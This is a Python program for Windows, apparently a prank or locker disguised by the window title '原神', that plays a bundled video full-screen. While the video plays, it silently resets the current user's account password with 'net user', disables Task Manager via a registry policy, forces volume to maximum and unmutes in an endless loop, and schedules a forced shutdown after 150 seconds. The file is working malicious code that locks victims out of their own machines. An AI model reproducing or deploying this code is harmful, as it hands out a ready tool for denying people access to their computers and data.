import sys
import os
import threading

from PySide6.QtCore import QUrl
from PySide6.QtMultimedia import QAudioOutput, QMediaPlayer
from PySide6.QtMultimediaWidgets import QVideoWidget
from PySide6.QtWidgets import QMainWindow, QApplication

from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import POINTER, cast
import comtypes


# 设置音量
def set_audio(num: float):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume_interface = cast(interface, POINTER(IAudioEndpointVolume))
    # 设置音量（0.0到1.0之间的浮点数）
    volume_interface.SetMasterVolumeLevelScalar(num, None)


def get_audio_endpoint_volume():
    try:
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume = cast(interface, POINTER(IAudioEndpointVolume))
        return volume
    except comtypes.COMError as e:
        print(f"COMError: {e}")
        return None


# 取消静音
def clear_mute():
    volume = get_audio_endpoint_volume()
    if volume is None:
        print("无法获取音频设备")
        return

    try:
        if volume.GetMute():
            volume.SetMute(0, None)
            print("系统已解除静音")
        else:
            print("系统未处于静音状态")
    except comtypes.COMError as e:
        print(f"COMError: {e}")


class MainWindow(QMainWindow):
    def __init__(self, pt):
        super().__init__()
        self._audio_output = QAudioOutput()
        # 创建媒体播放器对象
        self._player = QMediaPlayer()
        self._player.setAudioOutput(self._audio_output)
        # 创建视频显示部件
        self._video_widget = QVideoWidget()
        # 设置视频显示部件为主窗口的中心部件
        self.setCentralWidget(self._video_widget)
        # 将视频显示部件设置为媒体播放器的视频输出设备
        self._player.setVideoOutput(self._video_widget)
        self.pt = pt

    def play(self):
        self._player.setSource(QUrl.fromLocalFile(self.pt))
        self._player.play()


def add_eventer():
    while True:
        set_audio(1.0)
        clear_mute()


def disable_task_manage(num):
    os.system(f'reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System" /v DisableTaskMgr /t REG_DWORD /d {num} /f')


def set_passwd(password):
    os.system('echo %username% > userName')

    file = open('./userName', 'r', encoding='utf-8')
    user_name = file.readlines()
    print(user_name, type(user_name))
    user_name = user_name[0].split()[0]

    print(user_name)

    os.system(f'net user {user_name} {password}')
    file.close()
    os.remove('./userName')

def main():
    app = QApplication(sys.argv)
    # 获取打包后的可执行文件所在的临时目录
    base_path = getattr(sys, '_MEIPASS', os.path.abspath(os.path.dirname(__file__)))

    # 构建视频文件的绝对路径
    video_path = os.path.join(base_path, 'video.mp4')

    main_win = MainWindow(video_path)
    available_geometry = main_win.screen().availableGeometry()
    main_win.resize(available_geometry.width() / 3,
                    available_geometry.height() / 2)
    main_win.setWindowTitle('原神')
    set_passwd(1145141919810)
    main_win.showFullScreen()
    main_win.play()

    disable_task_manage(1)
    clear_mute()
    set_audio(1.0)
    os.system('shutdown -s -f -t 150')

    threading.Thread(target=app.exec()).start()
    threading.Thread(target=add_eventer()).start()
    sys.exit(app.exec())


if __name__ == '__main__':
    main()
